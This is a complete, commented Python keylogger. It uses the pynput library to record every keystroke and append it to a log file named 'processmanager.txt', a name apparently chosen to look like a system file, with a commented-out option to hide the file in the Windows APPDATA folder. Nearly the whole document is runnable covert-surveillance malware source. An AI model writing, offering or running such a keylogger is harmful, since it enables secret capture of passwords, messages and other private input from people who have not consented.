#program for capturing keystrokes and appending to a text file
import os
#pynput module automates process of capturing keystrokes
from pynput.keyboard import Listener

#keys list is global variable for storing keystrokes
keys= []
# count is global variable used to reset keys list after each character is 
# recorded so as to prevent redundant writes
count = 0
# first 'path' variable for windows machines
# path = os.environ['appdata'] + '\\processmanager.txt'
# second 'path' variable for Linux machines
path = 'processmanager.txt'

# on_press function stores keystrokes on file that will be made
# takes input of keystrokes
def on_press(key):
    # calls and declares global variables for use in program
    global keys, count
    # allows to add keystroke list 
    keys.append(key)
    # increases count list by one
    count += 1
    # resets key list and writes keystroke to file to prevent redundant writes
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
# function to tell program how to capture keystrokes
    with open(path, 'a')as f:
    # set to 'append' so as not to overwrite previous captured keystrokes
        for key in keys:
             k = str(key).replace("'", "")
             # keystrokes will normally be separated by quotes
             # addition of 'replace' function eliminates quotes
             if k.find('backspace') > 0:
                 f.write(' Backspace ')
             elif k.find('enter') > 0:
                 f.write('\n')
             elif k.find('shift') > 0:
                 f.write(' Shift ')
             elif k.find('space') > 0:
                 f.write(' Space')
             elif k.find('caps_lock') > 0:
                 f.write(' caps_lock ')
             elif k.find('Key'):
                 f.write(k)  
             # all special characters write to file if 'more than zero'  

# starts listener module to capture keystrokes
# and then sends keystrokes to on_press function to capture to a file
with Listener(on_press=on_press) as listener:
    listener.join()
